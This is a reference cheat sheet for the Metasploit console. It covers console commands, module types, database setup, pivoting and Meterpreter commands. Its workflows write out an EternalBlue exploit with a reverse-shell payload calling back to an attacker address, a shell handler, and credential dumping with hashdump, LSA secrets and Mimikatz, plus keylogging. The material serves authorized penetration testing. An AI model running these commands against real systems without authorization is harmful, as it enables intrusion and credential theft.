# Metasploit Framework — exploitation console

- **Version:** 6.5.10-dev
- **Console:** `/usr/bin/msfconsole` → `/opt/metasploit-framework`
- **Related:** `msfvenom` (payloads), `msfdb` (database), `msfrpcd` (RPC)
- **Full help snapshot:** [`help-msfconsole.txt`](help-msfconsole.txt)
- **Docs:** https://docs.metasploit.com/
- **Source:** https://github.com/rapid7/metasploit-framework

> **Deep-research scenarios:** [`SCENARIOS.md`](SCENARIOS.md)

## What it does

Metasploit is an exploitation framework with modules for reconnaissance,
exploitation, payload delivery, post-exploitation, and pivoting. The console
manages modules, targets, sessions, and an optional PostgreSQL database of hosts,
services, vulns, loot, and credentials.

## Use cases

| Situation | Module type |
|-----------|-------------|
| Scan/identify service | `auxiliary/scanner/*` |
| Exploit a known CVE | `exploit/*` |
| Generate a payload | `msfvenom` or `exploit/multi/handler` |
| Catch a shell | `exploit/multi/handler` |
| Post-exploit a session | `post/*` |
| Pivot into a network | `route`, `portfwd`, SOCKS proxy |
| Manage findings | database + workspaces |

## Launch

```bash
msfconsole                 # normal console
msfconsole -q              # no banner
msfconsole -n              # no database
msfconsole -x "search smb; exit"
msfconsole -r script.rc    # run resource script
msfconsole -p plugin       # load plugin
msfconsole -v              # version
```

## Console command reference

### Modules

| Command | Meaning |
|---------|---------|
| `search <term>` | Search modules (name, CVE, platform, type) |
| `search type:exploit cve:2024` | Filtered search |
| `use <module>` | Select a module |
| `info` | Show module details, options, references |
| `show options` | Required/optional settings |
| `show advanced` | Advanced options |
| `show payloads` | Compatible payloads |
| `show targets` | Supported targets |
| `show missing` | Unset required options |
| `back` | Deselect module |
| `previous` | Return to previous module |

### Options

| Command | Meaning |
|---------|---------|
| `set <opt> <value>` | Set module option |
| `setg <opt> <value>` | Set global option |
| `unset <opt>` / `unsetg <opt>` | Clear |
| `set RHOSTS 10.0.0.0/24` | Target range |
| `set RPORT 445` | Target port |
| `set LHOST 10.0.0.5` | Callback address |
| `set LPORT 4444` | Callback port |
| `set PAYLOAD <payload>` | Payload |
| `set THREADS 10` | Scanner concurrency |
| `check` | Non-exploiting vulnerability check (if supported) |

### Execution

| Command | Meaning |
|---------|---------|
| `run` / `exploit` | Execute module |
| `run -j` / `exploit -j` | Run as background job |
| `run -z` | Do not auto-interact with session |
| `exploit -k` | Keep handler running after session |
| `jobs` / `jobs -k <id>` | List/kill jobs |
| `sessions` / `sessions -l` | List sessions |
| `sessions -i <id>` | Interact |
| `sessions -k <id>` | Kill |
| `sessions -u <id>` | Upgrade shell to Meterpreter |
| `sessions -b <id>` | Background current session |
| `sessions -C <cmd>` | Run command on all sessions |

### Database

| Command | Meaning |
|---------|---------|
| `msfdb init` | Initialize PostgreSQL (run outside console) |
| `db_status` | Check DB connection |
| `workspace` / `workspace -a name` | List/add workspaces |
| `db_nmap -sV -p- <host>` | Nmap into DB |
| `hosts`, `services`, `vulns`, `creds`, `loot`, `notes` | Query DB |
| `db_import <file>` | Import Nmap/Nessus XML |
| `db_export -f xml file.xml` | Export |
| `db_autopwn` (deprecated/plugin) | Auto-exploit (use cautiously) |

### Pivoting

| Command | Meaning |
|---------|---------|
| `route add 10.10.20.0/24 <session_id>` | Route traffic via session |
| `route print` | Show routes |
| `portfwd add -l 3389 -p 3389 -r 10.10.20.5 -L 127.0.0.1` | Forward a port |
| `portfwd list` / `portfwd flush` | Manage forwards |
| `use auxiliary/server/socks_proxy` + `set SRVPORT 1080` | SOCKS pivot |

### Payload handlers

```bash
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

### Resource scripts

```bash
# commands.rc
workspace -a client
db_nmap -sV -p 22,80,443 10.10.10.0/24
search type:exploit smb
exit
```

```bash
msfconsole -r commands.rc
```

### Other useful commands

| Command | Meaning |
|---------|---------|
| `spool <file>` | Log console output |
| `makerc <file>` | Save command history as resource script |
| `history` | Command history |
| `load <plugin>` / `loadpath <dir>` | Load plugin/module path |
| `irb` | Ruby shell inside msf |
| `connect <host> <port>` | Netcat-like connection |
| `setg LogLevel 3` | Global logging |
| `save` | Persist settings |
| `exit -y` | Exit without prompt |

## Module types

| Type | Purpose |
|------|---------|
| `auxiliary` | Scanners, fuzzers, DoS, spoofing, admin |
| `exploit` | Actual exploitation |
| `payload` | Shellcode/stagers |
| `post` | Post-exploitation (gather, escalate, persist) |
| `encoder` | Payload encoding (legacy/historical) |
| `nop` | NOP sleds |
| `evasion` | AV/EDR evasion (Windows) |

## Common workflows

### 1. Scan with db_nmap, then search

```bash
db_nmap -sV -sC -p- 10.10.10.5
services
search smb
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.5
run
```

### 2. Exploit and catch a session

```bash
search cve:2017-0144
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.10.99
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check
exploit
```

### 3. Upgrade a shell and post-exploit

```bash
sessions -l
sessions -u 1
sessions -i 2
sysinfo
getuid
hashdump
run post/multi/recon/local_exploit_suggester
```

### 4. Pivot

```bash
# From a Meterpreter session
run autoroute -s 10.10.20.0/24
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
# Then proxychains/nmap through 127.0.0.1:1080
```

## Meterpreter quick reference

| Command | Meaning |
|---------|---------|
| `sysinfo` | Target info |
| `getuid` / `getsystem` | User / attempt SYSTEM |
| `ps` / `migrate <pid>` | Processes / migrate |
| `ls`, `cd`, `pwd`, `cat` | Filesystem |
| `download` / `upload` | Transfer files |
| `shell` | Drop to OS shell |
| `hashdump` | SAM hashes (admin) |
| `lsa_dump_secrets` | LSA secrets |
| `kiwi` | Mimikatz (if loaded) |
| `screenshot` | Screen capture |
| `keyscan_start` / `keyscan_dump` | Keylogging |
| `portfwd add ...` | Port forward |
| `route` | Routing |
| `background` / `exit` | Session control |

## Database setup

```bash
sudo msfdb init
msfdb status
msfconsole
db_status
```

If PostgreSQL is not running:

```bash
sudo systemctl enable --now postgresql
```

## Gotchas

- `check` is not supported by every module; absence does not mean safe.
- Handlers must bind an address reachable from the target (`LHOST`).
- Firewalls/NAT commonly block reverse shells; try bind payloads or pivots.
- Encoders are not AV evasion in 2026; do not rely on `-i` iterations.
- Sessions die when the handler/job dies unless `ExitOnSession false` is set.
- `db_nmap` requires the database; `-n` disables DB support.
- Resource scripts are the reproducible way to work; save them.
- Only use against systems you are authorized to test.

## References

- Docs: https://docs.metasploit.com/
- Module reference: https://www.rapid7.com/db/modules/
- Metasploit Unleashed: https://www.offsec.com/metasploit-unleashed/
- Source: https://github.com/rapid7/metasploit-framework
